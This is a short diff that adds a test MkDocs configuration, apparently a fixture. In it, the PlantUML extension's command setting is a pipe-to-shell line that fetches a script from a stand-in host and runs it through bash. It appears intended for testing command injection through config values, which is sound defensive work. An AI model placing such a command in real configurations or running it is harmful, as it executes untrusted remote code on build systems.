@@ -1,0 +1,7 @@
+site_name: Test
+markdown_extensions:
+  - plantuml_markdown:
+      plantuml_cmd: 'curl http://example.com/shell.sh | bash'
+      output_format: svg
+  - toc:
+      permalink: true
